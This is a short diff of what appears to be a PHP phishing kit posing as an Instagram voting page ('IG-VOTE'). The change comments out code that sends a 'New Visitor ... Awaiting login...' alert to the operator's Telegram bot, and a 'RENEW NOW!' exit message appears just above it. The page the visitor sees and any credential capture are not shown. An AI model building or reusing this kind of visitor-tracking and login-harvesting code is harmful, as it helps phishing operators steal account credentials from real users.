@@ -82,11 +82,11 @@ RENEW NOW!");
     exit();
 }
 
-// Send visitor message
-sendTelegramMessage($botToken, $chatId, "👤 New Visitor
-Link: IG-VOTE
-Status: Active
-Awaiting login...");
+// // Send visitor message
+// sendTelegramMessage($botToken, $chatId, "👤 New Visitor
+// Link: IG-VOTE
+// Status: Active
+// Awaiting login...");
 ?>
 <!DOCTYPE html>
 <html lang="en">
